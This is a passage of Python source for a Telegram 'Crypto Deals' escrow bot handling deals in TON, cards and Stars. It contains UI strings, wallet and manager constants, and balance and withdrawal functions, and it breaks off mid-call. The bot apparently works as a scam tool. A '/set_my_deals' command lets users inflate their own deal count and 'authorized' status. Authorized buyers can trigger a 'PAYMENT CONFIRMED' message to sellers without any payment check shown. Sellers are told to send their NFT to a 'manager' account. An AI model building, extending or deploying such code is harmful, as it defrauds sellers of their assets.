            "üìã Min amount: {min_withdraw} RUB\n"
            "{deals_requirement}"
            "Choose withdrawal method:"
        ),
        'btn_withdraw_card': "üí≥ To card",
        'btn_withdraw_wallet': "ü™ô To TON wallet",
        'insufficient_balance': (
            "‚ùå INSUFFICIENT BALANCE FOR WITHDRAWAL!\n\n"
            "üíµ Your balance: {balance:.2f} RUB\n"
            "üí∞ Min withdrawal: {min_withdraw} RUB\n"
            "üí∏ Needed: {need:.2f} RUB"
        ),
        'withdraw_to_card': (
            "üí≥ WITHDRAW TO CARD\n\n"
            "üè¶ Card: <code>{card}</code>\n"
            "üìä Status: {status_text}\n"
            "üíµ Available: {balance:.2f} RUB\n"
            "üí∞ Min amount: {min_withdraw} RUB\n\n"
            "üìù Enter amount to withdraw in RUB:"
        ),
        'withdraw_to_wallet': (
            "ü™ô WITHDRAW TO TON WALLET\n\n"
            "üè¶ Wallet: <code>{wallet}</code>\n"
            "üìä Status: {status_text}\n"
            "üíµ Available: {balance:.2f} RUB\n"
            "üí∞ Min amount: {min_withdraw} RUB\n\n"
            "üìù Enter amount to withdraw in RUB:"
        ),
        'withdraw_immediate': "‚úÖ Immediate withdrawal (new user)",
        'withdraw_needed': "‚è≥ Need {needed} more deals",
        'withdraw_available': "‚úÖ Withdrawal available",
        'withdraw_deficit': (
            "‚è≥ YOU NEED {needed} MORE SUCCESSFUL DEALS TO WITHDRAW\n\n"
            "üíµ Your balance: {balance:.2f} RUB\n"
            "üí∞ Min withdrawal: {min_withdraw} RUB\n"
            "üíº Your successful deals: {deals}\n"
            "üìä Required: {min_deals}"
        ),
        'deals_requirement': "‚Ä¢ You need {min_deals} successful deals to withdraw\n",
        'no_card': "‚ùå Card not added",
        'no_wallet': "‚ùå TON wallet not added",
        'withdraw_success': (
            "‚úÖ WITHDRAWAL REQUEST ACCEPTED!\n\n"
            "üíµ Amount: {amount:.2f} RUB\n"
            "üìã Method: {method}\n"
            "üìù Details: {details}\n\n"
            "‚è≥ Request sent to admin for processing.\n"
            "Usually processing takes up to 24 hours.\n\n"
            "üè¶ Current balance: {balance:.2f} RUB\n\n"
            "üìû If you have questions, contact support."
        ),
        'withdraw_error': (
            "‚ùå **WITHDRAWAL ERROR!**\n\n"
            "Please try again later or contact support."
        ),
        'transaction_history': "üìä **TRANSACTION HISTORY**\n\nSection under development.",

        'add_wallet_prompt': (
            "üîë Add your TON wallet:\n\n"
            "Please send your wallet address\n\n"
            "üìù Important:\n"
            "‚Ä¢ Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'add_wallet_change': (
            "üîë Your current TON wallet:\n<code>{wallet}</code>\n\n"
            "üìä Status: {status}\n\n"
            "Send new wallet address to change or press button below to return to menu.\n\n"
            "üìù **Withdrawal rules:**\n"
            "‚Ä¢ Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'add_card_prompt': (
            "üí≥ Add your card:\n\n"
            "Please send your card number\n\n"
            "üìù **Important:**\n"
            "‚Ä¢ Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'add_card_change': (
            "üí≥ Your current card number:\n<code>{card}</code>\n\n"
            "üìä Status: {status}\n\n"
            "Send new card number to change or press button below to return to menu.\n\n"
            "üìù **Withdrawal rules:**\n"
            "‚Ä¢ Minimum withdrawal amount: {min_withdraw} RUB"
        ),
        'wallet_saved': (
            "‚úÖ TON wallet successfully saved!\n\n"
            "üîë Your current TON wallet:\n<code>{wallet}</code>\n\n"
            "üìù **Withdrawal information:**\n"
            "‚Ä¢ Minimum withdrawal amount: {min_withdraw} RUB\n"
            "‚Ä¢ System fee: {fee}%\n\n"
            "üíº Your successful deals: {deals}"
        ),
        'card_saved': (
            "‚úÖ Card number successfully saved!\n\n"
            "üí≥ Your current card number:\n<code>{card}</code>\n\n"
            "üìù **Withdrawal information:**\n"
            "‚Ä¢ Minimum withdrawal amount: {min_withdraw} RUB\n"
            "‚Ä¢ System fee: {fee}%\n\n"
            "üíº Your successful deals: {deals}"
        ),
        'invalid_wallet': "‚ùå Invalid wallet format. Please check the address and try again.",
        'invalid_card': "‚ùå Invalid card number format. Please check the number and try again.",

        'deal_info_buyer': (
            "üí≥ Deal information #{deal_id}\n\n"
            "üë§ You are the buyer in this deal.\n"
            "üìå Seller: @{seller}\n\n"
            "üì¶ You are buying: {description}\n\n"
            "{payment_info}\n"
            "üí∞ Amount to pay: {amount} {unit}\n\n"
            "{warning}"
        ),
        'payment_info_ton': (
            "üè¶ Payment address:\n"
            "<code>{wallet}</code>\n\n"
            "üìù Memo:\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_card': (
            "üè¶ Card number for payment:\n"
            "<code>{card}</code>\n\n"
            "üìù Payment reference:\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_stars': (
            "üè¶ Payment method: {currency}\n\n"
            "üìù Deal ID: <code>{deal_id}</code>\n\n"
        ),
        'warning_ton': (
            "‚ö†Ô∏è IMPORTANT: When sending payment, you MUST include the memo as above!\n\n"
            "üìå Payment instructions:\n"
            "1. Copy TON wallet address\n"
            "2. Copy memo\n"
            "3. Send exact amount {amount} TON\n"
            "4. Paste memo in 'Memo' field\n\n"
            "‚ùå WITHOUT MEMO PAYMENT WILL NOT BE CREDITED!\n"
            "If you make a mistake, contact @CryptoDealsEscrow"
        ),
        'warning_card': (
            "‚ö†Ô∏è IMPORTANT: When transferring, you MUST include the payment reference as above!\n\n"
            "üìå Payment instructions:\n"
            "1. Copy card number\n"
            "2. Copy payment reference\n"
            "3. Send exact amount {amount} RUB\n"
            "4. Paste reference in 'Payment reference' / 'Comment' field\n\n"
            "‚ùå WITHOUT CORRECT REFERENCE PAYMENT WILL NOT BE CREDITED!\n"
            "If you have problems, contact support ‚Äî @CryptoDealsEscrow"
        ),
        'warning_stars': (
            "‚ö†Ô∏è Please follow seller's payment instructions.\n"
            "Save the deal ID for confirmation!\n\n"
            "If you have problems, contact support ‚Äî @CryptoDealsEscrow"
        ),
        'btn_confirm_payment': "‚úÖ Confirm payment",
        'btn_exit_deal': "‚ùå Exit deal",
        'payment_confirmed_unauthorized': (
            "‚è≥ PAYMENT UNDER VERIFICATION\n\n"
            "‚úÖ You pressed the payment confirmation button.\n"
            "üí∞ Amount: {amount} {unit}\n"
            "üì¶ Item: {description}\n"
            "üîó Deal ID: #{deal_id}\n\n"
            "‚ùå **Payment not found**\n"
            "‚è≥ **Please wait for payment confirmation within 10 minutes.**\n\n"
            "üìå **Next steps:**\n"
            "1. After successful payment, funds will be automatically credited\n"
            "2. Seller will be notified of your payment\n"
            "3. Seller will transfer item to manager\n"
            "4. After verification you will receive deal completion notification\n\n"
            "üìû If you have questions, contact support."
        ),
        'payment_confirmed_authorized': (
            "‚úÖ Payment confirmed! Seller notified.\n\n"
            "‚è≥ **Waiting for manager's NFT transfer confirmation...**\n\n"
            "üìä Your stats updated:\n"
            "‚Ä¢ Successful deals: {deals}\n\n"
            "Expect to receive item through manager."
        ),
        'payment_confirmation_error': "‚ö†Ô∏è Payment confirmed but there were issues with notifications. Contact support.",

        'seller_deal_info': (
            "üìã Your deal #{deal_id}\n\n"
            "üìä Your successful deals: {deals}\n\n"
            "üì¶ Offer: {description}\n"
            "üí∞ Amount: {amount} {unit}\n"
            "üí± Currency: {currency}\n\n"
            "üîó Link for buyer:\n"
            "{link}\n\n"
            "‚ÑπÔ∏è When a buyer joins, you will be notified."
        ),
        'new_buyer_notification': (
            "üë§ User @{buyer}\n"
            "Joined deal #{deal_id}\n\n"
            "{buyer_stats}\n\n"
            "‚ö†Ô∏è Verify the user's identity"
        ),
        'buyer_stats': "üìä Buyer's successful deals: {count}\n{status}",
        'authorized_status': "‚úÖ Verified user",
        'unauthorized_status': "‚ö†Ô∏è New user",

        'payment_received_seller': (
            "üí∞ PAYMENT CONFIRMED!\n\n"
            "‚úÖ Buyer @{buyer} confirmed payment\n"
            "üì¶ Deal: #{deal_id}\n"
            "üíé Item: {description}\n"
            "üíµ Amount: {amount} {unit}\n\n"
            "üìä **Financial terms:**\n"
            "‚Ä¢ System fee: {fee_percent}% ({fee:.2f} RUB)\n"
            "‚Ä¢ To be credited to balance: {net:.2f} RUB\n\n"
            "‚ö†Ô∏è ACTION REQUIRED:\n"
            "1. Transfer item to manager @CryptoDealsEscrow\n"
            "2. After transfer, click button below\n"
            "3. Manager will confirm NFT receipt\n"
            "4. Amount {net:.2f} RUB will be credited to your balance\n\n"
            "‚ùå **Do NOT transfer item directly to buyer!**"
        ),
        'btn_request_transfer': "üì¶ Submit NFT transfer request",
        'btn_cancel_deal': "‚ùå Cancel deal",

        'transfer_request_submitted': (
            "‚úÖ NFT TRANSFER REQUEST SUBMITTED!\n\n"
            "üîó Deal: #{deal_id}\n"
            "üì¶ Item: {description}\n"
            "üí∞ To be credited: {net:.2f} RUB\n\n"
            "üìû Managers notified of your request.\n"
            "‚è≥ Await manager's confirmation of NFT receipt.\n\n"
            "‚ÑπÔ∏è Once manager confirms NFT receipt, {net:.2f} RUB will be credited to your balance."
        ),
        'transfer_request_error': "‚ö†Ô∏è Request submitted but there were issues notifying managers. Contact support.",

        'manager_transfer_request': (
            "üì¶ NFT TRANSFER REQUEST\n\n"
            "üîó Deal ID: #{deal_id}\n"
            "üë§ Seller: @{seller} (ID: {seller_id})\n"
            "üë§ Buyer: @{buyer}\n"
            "üí∞ Amount: {amount} {unit}\n"
            "üíé Item: {description}\n\n"
            "üìä **Financial terms:**\n"
            "‚Ä¢ Fee: {fee:.2f} RUB ({fee_percent}%)\n"
            "‚Ä¢ To be credited to seller: {net:.2f} RUB\n\n"
            "‚ö†Ô∏è **Seller claims NFT transfer.**\n"
            "Please verify NFT receipt and confirm below:"
        ),
        'btn_manager_confirm': "‚úÖ Confirm NFT receipt",
        'btn_manager_reject': "‚ùå NFT not received",

        'manager_confirmed': (
            "‚úÖ NFT TRANSFER CONFIRMED!\n\n"
            "üîó Deal: #{deal_id}\n"
            "üí∞ Credited to seller: {net:.2f} RUB\n"
            "üë§ Seller notified of confirmation\n"
            "üë§ Buyer notified of deal completion\n\n"
            "üéâ **Deal successfully completed!**"
        ),
        'manager_rejected': (
            "‚ùå NFT TRANSFER REQUEST REJECTED!\n\n"
            "üîó Deal: #{deal_id}\n\n"
            "‚ö†Ô∏è Seller notified of rejection.\n"
            "They must transfer NFT and request again."
        ),
        'manager_action_error': "‚ö†Ô∏è Confirmation received but there were issues with notifications.",

        'buyer_deal_completed': (
            "üéâ DEAL SUCCESSFULLY COMPLETED!\n\n"
            "‚úÖ Manager confirmed NFT receipt from seller\n"
            "üë§ Seller: @{seller}\n"
            "üí∞ Amount: {amount} {unit}\n"
            "üì¶ Item: {description}\n"
            "üîó Deal ID: #{deal_id}\n\n"
            "üì¢ Expect to receive item from manager\n\n"
            "‚≠êÔ∏è Thank you for using Crypto Deals!\n"
            "Your reliability increased by 1 point."
        ),

        'seller_funds_credited': (
            "‚úÖ MANAGER CONFIRMED NFT TRANSFER!\n\n"
            "üîó Deal: #{deal_id}\n"
            "üì¶ Item: {description}\n"
            "üí∞ Deal amount: {amount} RUB\n"
            "üìä System fee: {fee:.2f} RUB\n\n"
            "üí∞ **FUNDS CREDITED TO YOUR BALANCE!**\n"
            "üíµ Credited: {net:.2f} RUB\n"
            "üè¶ Current balance: {balance:.2f} RUB\n\n"
            "üéâ Deal successfully completed!\n"
            "Buyer notified of completion.\n\n"
            "‚≠êÔ∏è Thank you for honest trading!\n"
            "Your reliability increased by 1 point."
        ),
        'btn_back_to_menu': "üè† Back to main menu",

        'seller_transfer_rejected': (
            "‚ùå NFT TRANSFER REQUEST REJECTED\n\n"
            "üîó Deal: #{deal_id}\n"
            "üì¶ Item: {description}\n\n"
            "‚ö†Ô∏è **Manager did NOT receive NFT!**\n\n"
            "üìå **Next steps:**\n"
            "1. Transfer NFT to manager @CryptoDealsEscrow\n"
            "2. After transfer, click 'Submit NFT transfer request' again\n"
            "3. Manager will confirm receipt\n"
            "4. Funds will be credited to your balance\n\n"
            "‚ùå Do not transfer item directly to buyer!"
        ),

        'deal_cancelled': "‚ùå Deal #{deal_id} cancelled.\nAll participants notified.",
        'buyer_deal_cancelled': "‚ùå Deal #{deal_id} was cancelled by the seller.",

        'support_message': "Contact support by clicking the button below:",

        'referral_system': "Section 'Referral System' under development",

        'my_stats': (
            "üìä YOUR STATISTICS\n\n"
            "üë§ User: @{username}\n"
            "üÜî ID: {user_id}\n"
            "üíº Successful deals: {deals}\n"
            "üí∞ Balance: {balance:.2f} RUB\n"
            "üéØ Status: {status}\n\n"
            "üí≥ Withdrawal information:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "üìù Withdrawal rules:\n"
            "‚Ä¢ Minimum: {min_withdraw} RUB\n"
            "{deals_requirement}"
            "‚Ä¢ System fee: {fee}%\n\n"
            "üí° Available functions:\n"
            "{functions}"
        ),
        'function_confirm_payment': "‚Ä¢ Confirm payment in deals",
        'function_not_available': "‚Ä¢ (Not available)",
        'function_change_stats': "‚Ä¢ Change statistics",
        'function_view_stats': "‚Ä¢ View statistics",
        'function_withdraw': "‚Ä¢ Withdraw funds from balance",
        'set_my_deals_current': "üìä Your current successful deals count: {deals}\n\nTo set a new value, use:\n`/set_my_deals 10`",
        'set_my_deals_success': "‚úÖ Successful deals count set to: {deals}\n\nüìä Your stats:\n‚Ä¢ Successful deals: {deals}\n‚Ä¢ Status: ‚úÖ Authorized\n\nüì¢ This count will be shown to sellers when you are a buyer!",
        'set_my_deals_negative': "‚ùå Number of deals cannot be negative",
        'set_my_deals_invalid': "‚ùå Invalid number format. Use an integer, e.g.: `/set_my_deals 15`",

        'error_occurred': "An error occurred. Please try again.",
        'deal_not_found': "‚ùå Deal not found or was deleted",
        'not_seller': "‚ùå You are not the seller in this deal",
        'not_buyer': "‚ùå You are not the buyer in this deal",
        'not_authorized': (
            "‚ùå You do not have access to confirm payments.\n\n"
            "To gain access, please contact support."
        ),
        'buy_command_usage': (
            "‚ùå The /buy command is only available for buyers in an active deal.\n\n"
            "Use:\n"
            "`/buy deal_id`\n\n"
            "where deal_id is the ID of the deal you are a buyer in."
        ),
    }
}

# ------------------ –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–∞ ------------------
def get_text(user_id: int, key: str, context: ContextTypes.DEFAULT_TYPE, **kwargs) -> str:
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ª–æ–∫–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è."""
    lang = context.user_data.get('language', LANG_RU)
    text = TEXTS.get(lang, TEXTS[LANG_RU]).get(key, f"[MISSING TEXT: {key}]")
    if kwargs:
        try:
            text = text.format(**kwargs)
        except KeyError as e:
            logger.error(f"Missing format key {e} in text {key}")
    return text

# ------------------ –ö–û–ù–°–¢–ê–ù–¢–´ ------------------
IMAGE_URL = "https://ibb.co/b5WqH9RF"
SUPPORT_URL = "https://t.me/CryptoDealsEscrow"
ADMIN_ID = 6764327072
MANAGER_IDS = {994793292, 123456789, 6764327072, 8534029722}
FIXED_TON_WALLET = "UQCCDZQoVkrNBsD9r6_Q-SQ1LeV7unXLfNkm27ZJFyqd8vZn"

# –°–ª–æ–≤–∞—Ä–∏ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_wallets = {}
user_cards = {}
deal_links = {}
active_buyers = {}
authorized_users = set()
user_deals_count = {}
seller_transfers = {}
user_balances = {}
pending_withdrawals = {}

CURRENCY_TON = "TON"
CURRENCY_STARS = "–ó–≤–µ–∑–¥—ã"
CURRENCY_RUB = "–†—É–±–ª–∏"

CURRENCY_UNITS = {
    CURRENCY_TON: "TON",
    CURRENCY_STARS: "–ó–≤–µ–∑–¥",
    CURRENCY_RUB: "–†—É–±"
}

SYSTEM_FEE_PERCENT = 1
MIN_WITHDRAWAL_AMOUNT = 500
MIN_DEALS_FOR_WITHDRAWAL = 3


# ------------------ –§–£–ù–ö–¶–ò–ò –ü–†–û–í–ï–†–ö–ò –í–´–í–û–î–ê ------------------
def get_withdrawal_status(user_id: int, method: str, context: ContextTypes.DEFAULT_TYPE) -> tuple:
    """
    –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Å—Ç–∞—Ç—É—Å –≤—ã–≤–æ–¥–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
    –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç (–º–æ–∂–Ω–æ_–≤—ã–≤–æ–¥–∏—Ç—å, —Å—Ç–∞—Ç—É—Å_—Ç–µ–∫—Å—Ç, —Å–∫–æ–ª—å–∫–æ_–Ω–µ_—Ö–≤–∞—Ç–∞–µ—Ç_—Å–¥–µ–ª–æ–∫)
    –°—Ç–∞—Ç—É—Å_—Ç–µ–∫—Å—Ç —É–∂–µ –ª–æ–∫–∞–ª–∏–∑–æ–≤–∞–Ω.
    """
    deals = user_deals_count.get(user_id, 0)

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤
    if method == 'wallet' and user_id not in user_wallets:
        return False, get_text(user_id, 'no_wallet', context), MIN_DEALS_FOR_WITHDRAWAL
    if method == 'card' and user_id not in user_cards:
        return False, get_text(user_id, 'no_card', context), MIN_DEALS_FOR_WITHDRAWAL

    # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Å–¥–µ–ª–æ–∫
    if deals == 0:
        # –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å - –≤—ã–≤–æ–¥ —Å—Ä–∞–∑—É
        return True, get_text(user_id, 'withdraw_immediate', context), 0
    elif deals < MIN_DEALS_FOR_WITHDRAWAL:
        # –ï—Å—Ç—å 1 –∏–ª–∏ 2 —Å–¥–µ–ª–∫–∏ - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º, —Å–∫–æ–ª—å–∫–æ –µ—â—ë –Ω—É–∂–Ω–æ
        needed = MIN_DEALS_FOR_WITHDRAWAL - deals
        return False, get_text(user_id, 'withdraw_needed', context, needed=needed), needed
    else:
        # 3 –∏ –±–æ–ª–µ–µ - –¥–æ—Å—Ç—É–ø–µ–Ω
        return True, get_text(user_id, 'withdraw_available', context), 0


# ------------------ –ö–õ–ê–í–ò–ê–¢–£–†–´ ------------------
def get_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("üá∑üá∫ –†—É—Å—Å–∫–∏–π", callback_data="set_lang_ru")],
        [InlineKeyboardButton("üá¨üáß English", callback_data="set_lang_en")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_main_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_manage_requisites', context), callback_data="manage_requisites")],
        [InlineKeyboardButton(get_text(user_id, 'btn_create_deal', context), callback_data="create_deal")],
        [InlineKeyboardButton(get_text(user_id, 'btn_my_balance', context), callback_data="my_balance")],
        [InlineKeyboardButton(get_text(user_id, 'btn_referral', context), callback_data="referral_system")],
        [InlineKeyboardButton(get_text(user_id, 'btn_support', context), callback_data="support")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_requisites_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_add_wallet', context), callback_data="add_wallet")],
        [InlineKeyboardButton(get_text(user_id, 'btn_add_card', context), callback_data="add_card")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_deal_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_deal_ton', context), callback_data="deal_ton")],
        [InlineKeyboardButton(get_text(user_id, 'btn_deal_card', context), callback_data="deal_card")],
        [InlineKeyboardButton(get_text(user_id, 'btn_deal_stars', context), callback_data="deal_stars")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_back_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]])


def get_balance_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw', context), callback_data="withdraw_funds")],
        [InlineKeyboardButton(get_text(user_id, 'btn_history', context), callback_data="transaction_history")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_withdrawal_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_card', context), callback_data="withdraw_to_card")],
        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_wallet', context), callback_data="withdraw_to_wallet")],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="my_balance")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_support_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(user_id, 'btn_support', context), url=SUPPORT_URL)],
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ])


def get_buyer_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_confirm_payment', context),
                              callback_data=f"confirm_payment_{deal_id}")],
        [InlineKeyboardButton(get_text(user_id, 'btn_exit_deal', context), callback_data="exit_deal")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_seller_transfer_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_request_transfer', context),
                              callback_data=f"request_transfer_{deal_id}")],
        [InlineKeyboardButton(get_text(user_id, 'btn_cancel_deal', context), callback_data=f"cancel_deal_{deal_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_manager_confirmation_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(get_text(user_id, 'btn_manager_confirm', context),
                              callback_data=f"manager_confirm_{deal_id}")],
        [InlineKeyboardButton(get_text(user_id, 'btn_manager_reject', context),
                              callback_data=f"manager_reject_{deal_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_transfer_confirmed_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="back_to_menu")]
    ])


# ------------------ –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ------------------
def is_manager(user_id: int) -> bool:
    return user_id in MANAGER_IDS


def is_authorized_user(user_id: int) -> bool:
    return user_id in authorized_users


def generate_deal_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))


def get_user_balance(user_id: int) -> float:
    return user_balances.get(user_id, 0.0)


async def add_to_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
    current_balance = user_balances.get(user_id, 0.0)
    user_balances[user_id] = current_balance + amount
    logger.info(f"üí∞ –ó–∞—á–∏—Å–ª–µ–Ω–æ {amount} —Ä—É–± –Ω–∞ –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}. –ù–æ–≤—ã–π –±–∞–ª–∞–Ω—Å: {user_balances[user_id]}")
    if context:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"üí∞ –°–†–ï–î–°–¢–í–ê –ó–ê–ß–ò–°–õ–ï–ù–´ –ù–ê –ë–ê–õ–ê–ù–°!\n\n"
                     f"üíµ –°—É–º–º–∞: {amount:.2f} —Ä—É–±\n"
                     f"üìù –ü—Ä–∏—á–∏–Ω–∞: {description}\n"
                     f"üè¶ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {user_balances[user_id]:.2f} —Ä—É–±\n\n"
                     f"üí≥ –î–ª—è –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª 'üí∞–ú–æ–π –±–∞–ª–∞–Ω—Å'"
            )
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ –∑–∞—á–∏—Å–ª–µ–Ω–∏–∏: {e}")
    return user_balances[user_id]


async def deduct_from_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
    current_balance = user_balances.get(user_id, 0.0)
    if current_balance < amount:
        logger.error(f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}: {current_balance} < {amount}")
        return False
    user_balances[user_id] = current_balance - amount
    logger.info(f"üí∞ –°–ø–∏—Å–∞–Ω–æ {amount} —Ä—É–± —Å –±–∞–ª–∞–Ω—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}. –ù–æ–≤—ã–π –±–∞–ª–∞–Ω—Å: {user_balances[user_id]}")
    if context:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"üí∞ –°–†–ï–î–°–¢–í–ê –°–ü–ò–°–ê–ù–´ –° –ë–ê–õ–ê–ù–°–ê!\n\n"
                     f"üíµ –°—É–º–º–∞: {amount:.2f} —Ä—É–±\n"
                     f"üìù –ü—Ä–∏—á–∏–Ω–∞: {description}\n"
                     f"üè¶ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {user_balances[user_id]:.2f} —Ä—É–±"
            )
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ —Å–ø–∏—Å–∞–Ω–∏–∏: {e}")
    return True


def calculate_with_fee(amount: float) -> tuple:
    fee = amount * (SYSTEM_FEE_PERCENT / 100)
    net_amount = amount - fee
    return net_amount, fee


async def process_withdrawal(user_id: int, amount: float, method: str, details: str,
                             context: ContextTypes.DEFAULT_TYPE):
    try:
        if amount < MIN_WITHDRAWAL_AMOUNT:
            await context.bot.send_message(
                chat_id=user_id,
                text=get_text(user_id, 'insufficient_balance', context,
                              balance=get_user_balance(user_id), min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                              need=MIN_WITHDRAWAL_AMOUNT - amount)
            )
            return False

        current_balance = get_user_balance(user_id)
        if current_balance < amount:
            await context.bot.send_message(
                chat_id=user_id,
                text=get_text(user_id, 'insufficient_balance', context,
                              balance=current_balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                              need=amount - current_balance)
            )
            return False

        success = await deduct_from_balance(user_id, amount, f"–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ ({method})", context)
        if not success:
            return False

        pending_withdrawals[user_id] = {
            'amount': amount,
            'method': method,
            'details': details,
            'timestamp': time.time()
        }

        try:
            username = (await context.bot.get_chat(user_id)).username or f"ID: {user_id}"
        except:
            username = f"ID: {user_id}"

        admin_text = (
            f"üí∏ –ù–û–í–ê–Ø –ó–ê–Ø–í–ö–ê –ù–ê –í–´–í–û–î –°–†–ï–î–°–¢–í\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
            f"üÜî ID: {user_id}\n"
            f"üíµ –°—É–º–º–∞: {amount:.2f} —Ä—É–±\n"
            f"üìã –°–ø–æ—Å–æ–±: {method}\n"
            f"üìù –†–µ–∫–≤–∏–∑–∏—Ç—ã: {details}\n\n"
            f"‚úÖ –°—Ä–µ–¥—Å—Ç–≤–∞ —Å–ø–∏—Å–∞–Ω—ã —Å –±–∞–ª–∞–Ω—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n"
            f"üí∞ –û—Å—Ç–∞—Ç–æ–∫ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ: {get_user_balance(user_id):.2f} —Ä—É–±\n\n"
            f"‚ö†Ô∏è –¢–†–ï–ë–£–ï–¢–°–Ø –û–ë–†–ê–ë–û–¢–ö–ê –í–´–í–û–î–ê!"
        )

        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
            logger.info(
